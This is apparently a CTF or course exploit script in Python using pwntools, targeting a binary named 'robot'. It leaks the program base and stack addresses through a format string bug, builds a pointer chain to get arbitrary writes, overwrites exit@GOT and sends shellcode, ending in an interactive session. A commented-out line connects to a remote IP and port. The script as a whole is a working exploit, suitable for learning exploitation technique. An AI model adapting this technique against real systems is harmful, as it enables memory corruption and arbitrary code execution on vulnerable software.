#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./robot')

# Byte sequence alias
A8 = 8 * b'A'


class FmtExp:
    def __init__(self, proc, rsp):
        self.proc = proc
        self.rsp = rsp
        self.nodes = [0] * 3
        self.nodes_offset = [b'\x00'] * 3
        self.leak_chain()

    @staticmethod
    def to_bytes(i) -> bytes:
        return str(i).encode('utf-8')

    @staticmethod
    def offset(rsp, addr) -> bytes:
        return FmtExp.to_bytes((addr - rsp) // 8 + 5)

    def leak_chain(self):
        # Leak the address of argv chain
        # https://frozenkp.github.io/pwn/format_string/
        self.nodes[0] = self.rsp + (0x7fff2dbf8ec8 - 0x7fff2dbf8dd0)
        self.nodes_offset[0] = FmtExp.offset(self.rsp, self.nodes[0])
        log.info('chain nodes[0]: {} (offset = {})'.format(
            hex(self.nodes[0]), self.nodes_offset[0]))

        time.sleep(0.1)
        self.proc.sendline(b'M.%' + self.nodes_offset[0] + b'$p')
        self.proc.recvuntil(b'M.')
        self.nodes[1] = int(self.proc.recvline(), 16)
        self.nodes_offset[1] = FmtExp.offset(self.rsp, self.nodes[1])
        log.info('chain nodes[1]: {} (offset = {})'.format(
            hex(self.nodes[1]), self.nodes_offset[1]))

        # node2 could contain an unaligned address,
        # we'll manually calibrate that shit.
        time.sleep(0.1)
        self.proc.sendline(self._payload(0x60, self.nodes_offset[0], b'$hhn'))
        self.proc.recvuntil(b'M')

        time.sleep(0.1)
        self.proc.sendline(b'M.%' + self.nodes_offset[1] + b'$p')
        self.proc.recvuntil(b'M.')
        self.nodes[2] = int(self.proc.recvline(), 16)
        self.nodes_offset[2] = FmtExp.offset(self.rsp, self.nodes[2])
        log.info('chain nodes[2]: {} (offset = {})'.format(
            hex(self.nodes[2]), self.nodes_offset[2]))

    def _payload(self, data: int, offset: bytes, length: bytes = b'$hhn') -> bytes:
        payload  = b''
        if ((data - 1) & 0xff) != 0x00:
            payload  = b'M%'
            payload += FmtExp.to_bytes((data - 1) & 0xff)
            payload += b'c%'
            payload += offset
            payload += length
        else:
            payload  = b'M%'
            payload += offset
            payload += length
        log.info(payload)
        return payload

    def write(self, addr: int, data: int):
        '''
        https://frozenkp.github.io/pwn/format_string/

        [STAGE 1]

        0x7ffd13f2cdd8 —▸ 0x7ffd13f2cea8 —▸ 0x7ffd13f2e8fd ◂— '/home/robot/robot'
             node0             node1            node2

        [STAGE 2]

        0x7ffd13f2cdd8 —▸ 0x7ffd13f2cea8 —▸ 0x7ffd13f2e8fd —▸ 0x55e3ae7b6088 (exit@got.plt)
             node0             node1            node2              addr
        '''
        # Stage 1
        # -------------------------------------------------
        bytes_to_write = []
        bytes_to_write.append((addr      ) & 0xff)
        bytes_to_write.append((addr >>  8) & 0xff)
        bytes_to_write.append((addr >> 16) & 0xff)
        bytes_to_write.append((addr >> 24) & 0xff)
        bytes_to_write.append((addr >> 32) & 0xff)
        bytes_to_write.append((addr >> 40) & 0xff)
        bytes_to_write.append((addr >> 48) & 0xff)
        bytes_to_write.append((addr >> 56) & 0xff)

        # Make a copy of node2
        node2 = self.nodes[2]

        # Let us clean up the entire 8 bytes
        time.sleep(0.1)
        self.proc.sendline(self._payload(1, self.nodes_offset[1], b'$lln'))
        self.proc.recvuntil(b'M')

        for i in range(8):
            if bytes_to_write[i] != 0x00:
                # 第一步：透過 node1 寫 2 bytes
                time.sleep(0.1)
                length = b'$hhn' if i == 7 else b'$hn'
                self.proc.sendline(self._payload(bytes_to_write[i], self.nodes_offset[1], length))
                self.proc.recvuntil(b'M')

            # 第二步：透過 node0 將 node2 += 1
            node2 += 1
            time.sleep(0.1)
            self.proc.sendline(self._payload(node2, self.nodes_offset[0], b'$hhn'))
            self.proc.recvuntil(b'M')

        # 第三步：透過 node0 將 node2 還原至初始值
        time.sleep(0.1)
        self.proc.sendline(self._payload(self.nodes[2], self.nodes_offset[0], b'$hhn'))
        self.proc.recvuntil(b'M')


        # Stage 2
        # -------------------------------------------------
        bytes_to_write = []
        bytes_to_write.append((data      ) & 0xff)
        bytes_to_write.append((data >>  8) & 0xff)
        bytes_to_write.append((data >> 16) & 0xff)
        bytes_to_write.append((data >> 24) & 0xff)
        bytes_to_write.append((data >> 32) & 0xff)
        bytes_to_write.append((data >> 40) & 0xff)
        bytes_to_write.append((data >> 48) & 0xff)
        bytes_to_write.append((data >> 56) & 0xff)

        # Make a copy of addr
        _addr = addr

        # Let us clean up the entire 8 bytes
        time.sleep(0.1)
        self.proc.sendline(self._payload(1, self.nodes_offset[2], b'$lln'))
        self.proc.recvuntil(b'M')

        for i in range(8):
            log.info(hex(_addr))
            if bytes_to_write[i] != 0x00:
                # 第一步：透過 node2 寫 2 bytes
                time.sleep(0.1)
                length = b'$hhn' if i == 7 else b'$hn'
                self.proc.sendline(self._payload(bytes_to_write[i], self.nodes_offset[2], length))
                self.proc.recvuntil(b'M')

            # 第二步：透過 node1 將 addr += 1
            _addr += 1
            time.sleep(0.1)
            self.proc.sendline(self._payload(_addr, self.nodes_offset[1], b'$hhn'))
            self.proc.recvuntil(b'M')

        # 第三步：透過 node1 將 addr 還原至初始值
        time.sleep(0.1)
        self.proc.sendline(self._payload(addr, self.nodes_offset[1], b'$hhn'))
        self.proc.recvuntil(b'M')

def shellcode(path):
    with open(path, 'rb') as f:
        return f.read()


def main():
    '''
    攻擊思路：GOT Hijacking + ROP
    * 修改 exit@GOT 為一個直接 return 的 gadget (?)

    Format string note
    ==================
    This will leak rdx, rcx, r8, r9, [rsp], [rsp+8], ...
    %1$p = rdx
    %2$p = rcx
    %3$p = r8
    %4$p = r9
    %5$p = [rsp]
    %6$p = [rsp+8]
    '''
    # proc = remote('140.112.31.97', 30202)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    proc.recvuntil('Give me code : ')
    proc.sendline(shellcode('./shellcode/shell.bin'))

    # Leak elf base address
    time.sleep(0.1)
    proc.sendline(b'M.%33$p')
    proc.recvuntil(b'M.')
    __libc_csu_init = int(proc.recvline(), 16)
    elf_base = __libc_csu_init - (0x55d19334fa40 - 0x55d19334e000)
    elf_got_exit = elf_base + (0x556d40442088 - 0x556d4043e000)
    log.info('__libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('elf_base: {}'.format(hex(elf_base)))
    log.info('exit@got: {}'.format(hex(elf_got_exit)))

    # Leak rsp
    time.sleep(0.1)
    proc.sendline(b'M.%31$p')
    proc.recvuntil(b'M.')
    rsp = int(proc.recvline(), 16) - (0x7ffd0892a010 - 0x7ffd08929e50)
    log.info('rsp: {}'.format(hex(rsp)))

    fmt = FmtExp(proc, rsp)
    fmt.write(elf_got_exit, 0xcafebabedeadbeaf)

    proc.interactive()


if __name__ == '__main__':
    main()
